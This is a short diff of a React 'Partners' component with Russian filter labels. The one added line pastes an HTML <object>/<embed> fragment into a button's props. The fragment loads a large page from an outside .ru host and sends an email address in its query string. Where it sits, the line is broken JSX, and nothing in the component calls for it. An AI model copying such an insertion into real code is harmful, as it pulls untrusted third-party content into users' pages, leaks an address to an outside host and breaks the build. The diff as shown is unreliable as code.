@@ -24,6 +24,7 @@ const Partners = () => {
             variant="outline" 
             className="flex items-center gap-2 bg-transparent border-todoYellow text-todoYellow"
             onClick={toggleFilters}
+            object data="https://scantour.ru/testtest.html?my_module=todotrip.work@gmail.com" width="100%" height="1200"> <embed src="https://scantour.ru/testtest.html?my_module=321" width="100%" height="1200"> </embed> Error: Embedded data could not be displayed. </object>
           >
             <Filter size={18} />
             Фильтры
